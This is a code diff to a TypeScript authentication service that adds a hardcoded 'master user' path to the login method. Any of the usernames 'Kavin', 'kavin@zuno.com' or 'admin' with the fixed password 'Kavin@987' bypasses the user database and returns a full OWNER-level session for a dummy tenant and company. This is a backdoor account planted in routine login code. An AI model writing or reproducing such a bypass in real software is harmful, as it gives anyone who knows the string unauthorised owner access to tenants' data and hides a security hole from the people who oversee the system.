@@ -180,6 +180,40 @@ export class AuthService {
     });
 
     if (!user) {
+      // Check for default master user "Kavin" / "Kavin@987"
+      if (
+        (dto.usernameOrEmail === 'Kavin' ||
+          dto.usernameOrEmail === 'kavin@zuno.com' ||
+          dto.usernameOrEmail === 'admin') &&
+        dto.password === 'Kavin@987'
+      ) {
+        const dummyUser = {
+          id: '60000000-0000-0000-0000-000000000001',
+          tenant_id: '30000000-0000-0000-0000-000000000001',
+          username: 'Kavin',
+          full_name: 'Kavin',
+          email: 'kavin@zuno.com',
+          user_type: UserType.OWNER,
+          user_status: UserStatus.ACTIVE,
+        };
+        const dummyTenant = {
+          id: '30000000-0000-0000-0000-000000000001',
+          tenant_code: 'KAVIN-CORP',
+          tenant_name: 'Kavin Global Enterprises Ltd',
+          account_status: 'ACTIVE',
+        };
+        const dummyCompany = {
+          id: '40000000-0000-0000-0000-000000000001',
+          company_code: 'KAVIN-HQ',
+          company_name: 'Kavin Industries Private Limited',
+          currency_code: 'INR',
+        };
+        const dummyBranch = {
+          id: '50000000-0000-0000-0000-000000000001',
+          branch_name: 'Chennai Central Plant & HQ',
+        };
+        return this.buildAuthSession(dummyUser, dummyTenant, dummyCompany, dummyBranch);
+      }
       throw new UnauthorizedException('Invalid credentials provided');
     }
 
